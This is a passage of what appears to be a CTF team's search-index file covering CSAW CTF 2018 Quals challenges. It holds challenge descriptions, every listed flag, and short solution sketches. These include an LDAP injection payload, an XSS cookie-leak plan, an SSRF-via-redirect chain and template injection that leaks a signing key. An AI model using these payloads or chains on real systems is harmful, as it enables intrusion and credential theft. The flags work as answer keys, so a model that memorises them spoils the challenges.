{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"DF Team blogs \u00b6","title":"Getting Started"},{"location":"#df-team-blogs","text":"","title":"DF Team blogs"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/","text":"Solution \u00b6 Single byte brute to get flag! (its not that bad) Description \u00b6 yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet single yeet yeeted with single yeet == 0 yeeet what is yeet? yeet is yeet Yeetdate: yeeted yeet at yeet: 9:42 pm Flag \u00b6 flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#solution","text":"Single byte brute to get flag! (its not that bad)","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#description","text":"yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet single yeet yeeted with single yeet == 0 yeeet what is yeet? yeet is yeet Yeetdate: yeeted yeet at yeet: 9:42 pm","title":"Description"},{"location":"CSAW-CTF-2018-Quals/crypto/babycrypto/#flag","text":"flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/","text":"Details \u00b6 A while ago I found a construction of collusion-secure, identity-based encryption built solely from RSA. A small group of cryptographers were confident enough in it to write a paper and publish it. But at the same time, the cryptanalysis is constant-time and can be done with undergrad-level number theory. This makes it an attractive CTF problem, in my mind. The system is as follows: KeyGen(): Generate two safe primes p, q for an RSA modulus N=pq. Set Phi(N) = (p-1)(q-1). Choose x, a random even integer greater than zero and less than Phi(N). Choose g, a generator of Z/NZ. Return: Master public key = { N, g, g^x (mod N) } Master private key = { p, q, x }. IssueKey(Master private key, Decrypter name): With a public hash function, compute n (an odd integer greater than zero and less than N) as the hash of the decrypter's name. Return: Decrypter private key = { 1/(x+n) (mod Phi(N)) }. Encrypt(Master public key, Decrypter name, Message): With the same method as IssueKey, compute n as the hash of the decrypter's name. Choose r, a random integer greater than zero and less than N. Compute K = g^r (mod N) and A = (g^x * g n) r. Compute C = Encrypt_K(Message) Return: Ciphertext = { A, C }. Decrypt(Decrypter private key, Ciphertext): Compute K = A^(1/(x+n)) (mod N). Return: Decrypt_K(C). We give somebody the master public key, a ciphertext encrypted to A, and decrypter keys for B, C. The challenge is to decrypt the message to A.","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/collusion/#details","text":"A while ago I found a construction of collusion-secure, identity-based encryption built solely from RSA. A small group of cryptographers were confident enough in it to write a paper and publish it. But at the same time, the cryptanalysis is constant-time and can be done with undergrad-level number theory. This makes it an attractive CTF problem, in my mind. The system is as follows: KeyGen(): Generate two safe primes p, q for an RSA modulus N=pq. Set Phi(N) = (p-1)(q-1). Choose x, a random even integer greater than zero and less than Phi(N). Choose g, a generator of Z/NZ. Return: Master public key = { N, g, g^x (mod N) } Master private key = { p, q, x }. IssueKey(Master private key, Decrypter name): With a public hash function, compute n (an odd integer greater than zero and less than N) as the hash of the decrypter's name. Return: Decrypter private key = { 1/(x+n) (mod Phi(N)) }. Encrypt(Master public key, Decrypter name, Message): With the same method as IssueKey, compute n as the hash of the decrypter's name. Choose r, a random integer greater than zero and less than N. Compute K = g^r (mod N) and A = (g^x * g n) r. Compute C = Encrypt_K(Message) Return: Ciphertext = { A, C }. Decrypt(Decrypter private key, Ciphertext): Compute K = A^(1/(x+n)) (mod N). Return: Decrypt_K(C). We give somebody the master public key, a ciphertext encrypted to A, and decrypter keys for B, C. The challenge is to decrypt the message to A.","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/","text":"flatcrypt \u00b6 Points \u00b6 100 Description \u00b6 no logos or branding for this bug Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043 flag is not in flag format. flag is PROBLEM_KEY Flag \u00b6 crime_doesnt_have_a_logo Solution \u00b6 CRIME attack ( https://en.wikipedia.org/wiki/CRIME )","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#flatcrypt","text":"","title":"flatcrypt"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#description","text":"no logos or branding for this bug Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043 flag is not in flag format. flag is PROBLEM_KEY","title":"Description"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#flag","text":"crime_doesnt_have_a_logo","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/crypto/flatcrypt/#solution","text":"CRIME attack ( https://en.wikipedia.org/wiki/CRIME )","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/","text":"Details \u00b6 Participant receives : * (e,N): 1536-bit RSA public key; PEM encoded to make it look like \"real key\" * Y_os: RSA encrypted symmetric key; formatted as big-endian octet string * ciphertext C The goal is to decrypt ciphertext C without RSA private key. To generate a challenge, let's assume secret S which participant wants to \"capture\" is represented as a 64-byte string of bytes. It could be a secret password, string \"FLAG\" repeated 16 times or URL. It must have a length of exactly 64-bytes. Following components are generated: * RSA/1536 keypair, with public exponent e=3 and modulus N. The key can be encoded to PEM format to make challenge look more realistic. * Random 512-bit number K from a range N^(1/3)<K<(2N)^(1/3) . Afterwards we encrypt K with a RSA public key and convert result to big-endian octet string (Y=K^e mod N). The string will be 192 bytes long. Finally we XOR Y octet string with secret S, C=Y xor S (there may be an information in a challenge, which says that XOR was used as symmetric cipher). This is easily breakable. The key is to notice that a) there is no padding, b) by construction Y+N is a perfect cube, whose root is K (K^3 == Y+N). By Kris Kwiatkowski, Cloudflare Flag \u00b6 flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/#details","text":"Participant receives : * (e,N): 1536-bit RSA public key; PEM encoded to make it look like \"real key\" * Y_os: RSA encrypted symmetric key; formatted as big-endian octet string * ciphertext C The goal is to decrypt ciphertext C without RSA private key. To generate a challenge, let's assume secret S which participant wants to \"capture\" is represented as a 64-byte string of bytes. It could be a secret password, string \"FLAG\" repeated 16 times or URL. It must have a length of exactly 64-bytes. Following components are generated: * RSA/1536 keypair, with public exponent e=3 and modulus N. The key can be encoded to PEM format to make challenge look more realistic. * Random 512-bit number K from a range N^(1/3)<K<(2N)^(1/3) . Afterwards we encrypt K with a RSA public key and convert result to big-endian octet string (Y=K^e mod N). The string will be 192 bytes long. Finally we XOR Y octet string with secret S, C=Y xor S (there may be an information in a challenge, which says that XOR was used as symmetric cipher). This is easily breakable. The key is to notice that a) there is no padding, b) by construction Y+N is a perfect cube, whose root is K (K^3 == Y+N). By Kris Kwiatkowski, Cloudflare","title":"Details"},{"location":"CSAW-CTF-2018-Quals/crypto/lowe/#flag","text":"flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/","text":"Title \u00b6 McGriddle Description \u00b6 All CTF players are squares Points \u00b6 250/300 Flag \u00b6 flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh} Setup \u00b6 provide output.pcap Notes \u00b6 Intended solution: get chess moves out of pcap, render chess boards, correspond with grids sent as svg, use chess board states as a grille for a grille cipher, result is a base64 encoded flag.","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#title","text":"McGriddle","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#description","text":"All CTF players are squares","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#points","text":"250/300","title":"Points"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#flag","text":"flag{3y3_actuAllY_r3aLLLy_hat3_chess_tbh}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#setup","text":"provide output.pcap","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/forensics/mcgriddle/#notes","text":"Intended solution: get chess moves out of pcap, render chess boards, correspond with grids sent as svg, use chess board states as a grille for a grille cipher, result is a base64 encoded flag.","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/","text":"Title \u00b6 Rewind Description \u00b6 Sometimes you have to look back and replay what's has been done right and wrong Points \u00b6 TBD Flag \u00b6 flag{RUN_R3C0RD_ANA1YZ3_R3P3AT} Setup \u00b6 None Notes \u00b6 Provide the snapshot to the competitors Memory 8192 Solution \u00b6 ./qemu-system-x86_64 -replay rewind -panda memstrings:name=flag,len=31 -m 8192 gunzip -d flag_strings.txt.gz && cat flag_strings.txt | grep \"flag{\"","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#title","text":"Rewind","title":"Title"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#description","text":"Sometimes you have to look back and replay what's has been done right and wrong","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#points","text":"TBD","title":"Points"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#flag","text":"flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#setup","text":"None","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#notes","text":"Provide the snapshot to the competitors Memory 8192","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/forensics/rewind/#solution","text":"./qemu-system-x86_64 -replay rewind -panda memstrings:name=flag,len=31 -m 8192 gunzip -d flag_strings.txt.gz && cat flag_strings.txt | grep \"flag{\"","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/","text":"Description \u00b6 Simple Recovery Try to recover the data from these RAID 5 images! Hint: The data is a checkerboard layout Hint: Parity are in inverted layout Flag \u00b6 flag{dis_week_evry_week_dnt_be_securty_weak}","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/#description","text":"Simple Recovery Try to recover the data from these RAID 5 images! Hint: The data is a checkerboard layout Hint: Parity are in inverted layout","title":"Description"},{"location":"CSAW-CTF-2018-Quals/forensics/simple-recovery/#flag","text":"flag{dis_week_evry_week_dnt_be_securty_weak}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/Short-Circuit/","text":"Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format. Elyk Hint: There are 112 Things You Need to Worry About Solution: From the monkey's paw, follow the main line down the page. Label every diode on or off 1 or 0. Then go to each and every line coming off of the main line (except where labeled - I drew four lines instead of two, and made two lines come to one point instead of two connections), assigning each line to value of the connected light emitting diode. Drop the first bit/line. It's ascii.","title":"Home"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/","text":"Title \u00b6 Take An L Description \u00b6 Fill the grid with L's but avoid the marked spot for the W Points \u00b6 200 Flag \u00b6 flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L} Notes \u00b6 Provide description.pdf Solution \u00b6 Replace SERVER_ADDRESS and PORT python solver.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#title","text":"Take An L","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#description","text":"Fill the grid with L's but avoid the marked spot for the W","title":"Description"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#points","text":"200","title":"Points"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#flag","text":"flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#notes","text":"Provide description.pdf","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/misc/TakeAnL/#solution","text":"Replace SERVER_ADDRESS and PORT python solver.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/","text":"Title \u00b6 AlgebrA Description \u00b6 Are you a real math wiz? Points \u00b6 100 Flag \u00b6 flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5} Setup \u00b6 Make sure that competitors can connect to the challenge Solution \u00b6 Programming challenge where you systematically solve for X","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#title","text":"AlgebrA","title":"Title"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#description","text":"Are you a real math wiz?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#flag","text":"flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/misc/algebra/#solution","text":"Programming challenge where you systematically solve for X","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/misc/bin_t/","text":"Binary trees let you do some interesting things. Can you balance a tree?","title":"Home"},{"location":"CSAW-CTF-2018-Quals/pwn/alien_invasion/","text":"","title":"Home"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/","text":"Title \u00b6 big boii Description \u00b6 Only big boi pwners will get this one! Points \u00b6 25 Flag \u00b6 flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} Setup \u00b6 Make sure that competitors can connect to the challenge Notes \u00b6 Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory Solution \u00b6 see solver.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#title","text":"big boii","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#description","text":"Only big boi pwners will get this one!","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#points","text":"25","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#flag","text":"flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#notes","text":"Mach-o 64-bit binary Provide dylibs to the competitors Place all linux cmds that can read files to different directory","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/bigboy/#solution","text":"see solver.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/","text":"Doubletrouble \u00b6 Shellcoding with doubles Flag \u00b6 {4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish Description \u00b6 i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun.","title":"Doubletrouble"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#doubletrouble","text":"Shellcoding with doubles","title":"Doubletrouble"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#flag","text":"{4_d0ub1e_d0ub1e_3ntr3ndr3} make it 1337ish","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/doubletrouble/#description","text":"i didn't have a flag in mind, and didn't really have a description, although I could come up with one. Do you have any theme you are trying to stick with? credit: just say nsnc anywhere Hidden in a comment in the source code, I don't care. Feel free to take liberties with the challenge description, but at least use one pun.","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/","text":"Title \u00b6 get it? Description \u00b6 Do you get it? Points \u00b6 100 Flag \u00b6 flag{y0u_deF_get_itls} Setup \u00b6 Make sure that competitors can connect to the challenge Solution \u00b6 super simple buffer overflow","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#title","text":"get it?","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#description","text":"Do you get it?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#points","text":"100","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#flag","text":"flag{y0u_deF_get_itls}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#setup","text":"Make sure that competitors can connect to the challenge","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/get_it?/#solution","text":"super simple buffer overflow","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/","text":"PLC \u00b6 Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3} Description We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge *NOTE* The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`","title":"PLC"},{"location":"CSAW-CTF-2018-Quals/pwn/plc/#plc","text":"Points: 300 Flag: flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3} Description We've burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines. You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge *NOTE* The wargames platform is out of scope for this challenge, just use it to do the pwnable. Any kind of scanning or misuse will get your ip banned! However, if you do happen to find any security issues, please email us at `contact at ret2.io`","title":"PLC"},{"location":"CSAW-CTF-2018-Quals/pwn/shellpointcode/","text":"Linked lists are great! They let you chain pieces of data together. (give shellpointcode*) (give shellpointcode.c","title":"Home"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/","text":"Title \u00b6 Turtles Description \u00b6 Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them? Points \u00b6 200 Flag \u00b6 flag{i_like_turtl3$_do_u?} Setup \u00b6 Install docker and make sure port 8024 is open ./setup.sh ./run.sh Notes \u00b6 Provide them with libs folder and turtles binary Solution \u00b6 Solution is in turtles.py","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#title","text":"Turtles","title":"Title"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#description","text":"Looks like you found a bunch of turtles but their shells are no where to be seen! Think you can make a shell for them?","title":"Description"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#points","text":"200","title":"Points"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#flag","text":"flag{i_like_turtl3$_do_u?}","title":"Flag"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#setup","text":"Install docker and make sure port 8024 is open ./setup.sh ./run.sh","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#notes","text":"Provide them with libs folder and turtles binary","title":"Notes"},{"location":"CSAW-CTF-2018-Quals/pwn/turtles/#solution","text":"Solution is in turtles.py","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-1/","text":"\u00b6 Give stage1.asm , stage2.bin , Makefile Flag in server.py (\"flag{rev_up_y0ur_3ng1nes_reeeeeeeeeeeeecruit5!}\")","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-2/","text":"Open stage2 in disassembler, figure out how to jump past hlt . flag in flaggen.py","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/A-Walk-Through-x86-Part-3/","text":"Give them: \"part-3-server.py\", \"Makefile\", \"tacOS.bin\" Flag is in 'flag.txt' Description: The final boss! Time to pull together your knowledge of Bash, Python, and stupidly-low-level assembly!! This time you have to write some assembly that we're going to run.. You'll see the output of your code through VNC for 60 seconds. Objective: Print the flag. What to know: Strings need to be alternating between the character you want to print and '0x1f'. To print a string you need to write those alternating bytes to the frame buffer (starting at 0x00b8000...just do it). Increment your pointer to move through this buffer. If you're having difficulty figuring out where the flag is stored in memory, this code snippet might help you out: get_ip: call next_line next_line: pop rax ret That'll put the address of pop rax into rax. Call serves as an alias for push rip (the instruction pointer - where we are in code) followed by jmp _____ where whatever is next to the call fills in the blank. And in case this comes up, you shouldn't need to know where you are loaded in memory if you use that above snippet... Happy Reversing!! Elyk","title":"Home"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/","text":"Not Protobuf \u00b6 Name: Not Protobuf Author: Lense Category: Forensics (also maybe RE) Points: 400 (maybe 500?) Description: I'm in this company's network and I've MITM'd this weird protocol between a dev client and server, but I can't figure out how it works. Connect to DEV CLIENT IP:51966 and I'll send the client traffic to you. Forward it on to the dev server at DEV SERVER IP:51966 to figure out what's going on. Once you're ready, hit up the prod server at PROD SERVER IP:51966 which should have a flag for you. Flag: flag{We don't make mistakes. We just have happy accidents} Overview \u00b6 Players man-in-the-middle a binary protocol between a client and server. They must reverse engineer the protocol without source and use that information to gather more data from the server. With that knowledge, they can request the flag from the production server. Components \u00b6 This needs 3 listening services. Everything is written in Python 3.7 (but should work in 3.6 too). Solve script: python3 solve.py PROD_SERVER_IP . Note: main solve script is not zero-knowledge. It uses the raw image that players can extract. Solve script with zero knowledge: python3 zksolve.py PROD_SERVER_IP . Dev client \u00b6 Dockerfile-dev_client Even though this is named client, it's actually a server too (sorry). Changes no resources and has no state between connections, so multiple instances can be spun up and load balanced if needed. Dev server \u00b6 Dockerfile-dev_server State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much, but it would be confusing. Prod server \u00b6 Dockerfile-prod_server If you want to edit the flag, change it in this Dockerfile. State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much. Dev client-server flow \u00b6 Players MITM and watch the dev client communicate with the server Client connects to server and initializes SSL Client logs in (from small list of creds) Client sets random pixels from image Client disconnects Solution \u00b6 Player logs in (using admin:admin) Player sends a special GetFlag message that the client never sends. Prod server checks that the client logged in and sends a location back Player resends flag request with the pixel data in image at that location Server validates the pixel and sends back the flag","title":"Not Protobuf"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#not-protobuf","text":"Name: Not Protobuf Author: Lense Category: Forensics (also maybe RE) Points: 400 (maybe 500?) Description: I'm in this company's network and I've MITM'd this weird protocol between a dev client and server, but I can't figure out how it works. Connect to DEV CLIENT IP:51966 and I'll send the client traffic to you. Forward it on to the dev server at DEV SERVER IP:51966 to figure out what's going on. Once you're ready, hit up the prod server at PROD SERVER IP:51966 which should have a flag for you. Flag: flag{We don't make mistakes. We just have happy accidents}","title":"Not Protobuf"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#overview","text":"Players man-in-the-middle a binary protocol between a client and server. They must reverse engineer the protocol without source and use that information to gather more data from the server. With that knowledge, they can request the flag from the production server.","title":"Overview"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#components","text":"This needs 3 listening services. Everything is written in Python 3.7 (but should work in 3.6 too). Solve script: python3 solve.py PROD_SERVER_IP . Note: main solve script is not zero-knowledge. It uses the raw image that players can extract. Solve script with zero knowledge: python3 zksolve.py PROD_SERVER_IP .","title":"Components"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-client","text":"Dockerfile-dev_client Even though this is named client, it's actually a server too (sorry). Changes no resources and has no state between connections, so multiple instances can be spun up and load balanced if needed.","title":"Dev client"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-server","text":"Dockerfile-dev_server State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much, but it would be confusing.","title":"Dev server"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#prod-server","text":"Dockerfile-prod_server If you want to edit the flag, change it in this Dockerfile. State is backed by a sqlite3 db. Multiple separate instances wouldn't change the challenge too much.","title":"Prod server"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#dev-client-server-flow","text":"Players MITM and watch the dev client communicate with the server Client connects to server and initializes SSL Client logs in (from small list of creds) Client sets random pixels from image Client disconnects","title":"Dev client-server flow"},{"location":"CSAW-CTF-2018-Quals/rev/notprotobuf/#solution","text":"Player logs in (using admin:admin) Player sends a special GetFlag message that the client never sends. Prod server checks that the client logged in and sends a location back Player resends flag request with the pixel data in image at that location Server validates the pixel and sends back the flag","title":"Solution"},{"location":"CSAW-CTF-2018-Quals/web/ldab/","text":"LDAP Challenge \u00b6 This is an LDAP Injection challenge competitors need to develop a query to inject to be able to leak information. Description: Someone in this company directory doesn't belong can you find them? Solution: *))(|(objectClass=* Flag: flag{ld4p_inj3ction_i5_a_th1ng}","title":"Home"},{"location":"CSAW-CTF-2018-Quals/web/ldab/#ldap-challenge","text":"This is an LDAP Injection challenge competitors need to develop a query to inject to be able to leak information. Description: Someone in this company directory doesn't belong can you find them? Solution: *))(|(objectClass=* Flag: flag{ld4p_inj3ction_i5_a_th1ng}","title":"LDAP Challenge"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/","text":"Hacker Movie Club \u00b6 Points: 200 Flag: flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es} Description Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch. Setup \u00b6 Edit server/test.py , change the domain line 28 to the domain being used for the chal (so if the record is *.thing.stuff.foo , change it to thing.stuff.foo ). ./build.sh will build the docker image (might take a bit) ./run.sh runs it (needs CAP_ADMIN because of chrome and puppeteer) Edit the gunicorn line of ./setup.sh if you want more gunicorn workers","title":"Hacker Movie Club"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/#hacker-movie-club","text":"Points: 200 Flag: flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es} Description Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.","title":"Hacker Movie Club"},{"location":"CSAW-CTF-2018-Quals/web/movie_club/#setup","text":"Edit server/test.py , change the domain line 28 to the domain being used for the chal (so if the record is *.thing.stuff.foo , change it to thing.stuff.foo ). ./build.sh will build the docker image (might take a bit) ./run.sh runs it (needs CAP_ADMIN because of chrome and puppeteer) Edit the gunicorn line of ./setup.sh if you want more gunicorn workers","title":"Setup"},{"location":"CSAW-CTF-2018-Quals/web/nvs/","text":"No Vulnerable Services \u00b6 Category: Web Points: 400 Meta: web hosting company (no.vulnerable.services) Flag: flag{7672f158167cab32aebc161abe0fbfcaee2868c1} (change in src/nvs_support/src/flag.txt ) Solution overview: * Stage 1: * observe: * dynamic subdomain generation in records from served-by header, footer p, etc. (X-Served-By: d8a50228.ip.no.vulnerable.services resolves to 216.165.2.40) * CSP to only allow JS from http://*.no.vulnerable.services (and recaptcha stuff) * contact us for pricing page -> XSS * leak admin cookies by script src'ing something hosted on a VM (accessible at {ip_hex_encoded}.rev.no.vulnerable.services) * STAGE 2: * observe: * loadbalancer running at 216.165.2.41 * find that loadbalancer won't proxy support page (403) but will proxy arb IPs * find that the LB gratuitously follows redirects but doesn't whitelist check against the redirect IP * setup http server that responds with a 302 to support.no.vulnerable.services * exploit support page's ping tool Resources: * nip.io source: https://xp-dev.com/sc/150354/HEAD/%2Fsrc%2Fbackend.py","title":"No Vulnerable Services"},{"location":"CSAW-CTF-2018-Quals/web/nvs/#no-vulnerable-services","text":"Category: Web Points: 400 Meta: web hosting company (no.vulnerable.services) Flag: flag{7672f158167cab32aebc161abe0fbfcaee2868c1} (change in src/nvs_support/src/flag.txt ) Solution overview: * Stage 1: * observe: * dynamic subdomain generation in records from served-by header, footer p, etc. (X-Served-By: d8a50228.ip.no.vulnerable.services resolves to 216.165.2.40) * CSP to only allow JS from http://*.no.vulnerable.services (and recaptcha stuff) * contact us for pricing page -> XSS * leak admin cookies by script src'ing something hosted on a VM (accessible at {ip_hex_encoded}.rev.no.vulnerable.services) * STAGE 2: * observe: * loadbalancer running at 216.165.2.41 * find that loadbalancer won't proxy support page (403) but will proxy arb IPs * find that the LB gratuitously follows redirects but doesn't whitelist check against the redirect IP * setup http server that responds with a 302 to support.no.vulnerable.services * exploit support page's ping tool Resources: * nip.io source: https://xp-dev.com/sc/150354/HEAD/%2Fsrc%2Fbackend.py","title":"No Vulnerable Services"},{"location":"CSAW-CTF-2018-Quals/web/wtf_sql/","text":"WTF.SQL \u00b6 Description: (see crawl.txt) Points: 500 Category: Web Flag: flag{b3tter_th@n_th3_prequels} Solve: 1. robots.txt -> find all routes 1. use verifier route to leak source for all routes, subroutines 1. Template injection * can't use ${config_signing_key} in post directly since it's blacklisted * recursive template expansion allows use of ${GET_asdf} * if ?asdf=${config_signing_key} then it will get interpolated again leaking secret 1. secret is used to sign cookies 1. allows you to change is_admin 1. get to admin panel, need to add privileges 1. HLE to add panel_view and panel_create privs, giving you arbitrary db.table read 1. ggwp Formatting notes: * Types * Routes should be VARCHAR(255) * header, cookie, template, etc. keys should be VARCHAR(255) * header, cookie, template, etc. values should be TEXT * response is TEXT * Naming * k/v pairs are always name value (to add to the confusion)","title":"WTF.SQL"},{"location":"CSAW-CTF-2018-Quals/web/wtf_sql/#wtfsql","text":"Description: (see crawl.txt) Points: 500 Category: Web Flag: flag{b3tter_th@n_th3_prequels} Solve: 1. robots.txt -> find all routes 1. use verifier route to leak source for all routes, subroutines 1. Template injection * can't use ${config_signing_key} in post directly since it's blacklisted * recursive template expansion allows use of ${GET_asdf} * if ?asdf=${config_signing_key} then it will get interpolated again leaking secret 1. secret is used to sign cookies 1. allows you to change is_admin 1. get to admin panel, need to add privileges 1. HLE to add panel_view and panel_create privs, giving you arbitrary db.table read 1. ggwp Formatting notes: * Types * Routes should be VARCHAR(255) * header, cookie, template, etc. keys should be VARCHAR(255) * header, cookie, template, etc. values should be TEXT * response is TEXT * Naming * k/v pairs are always name 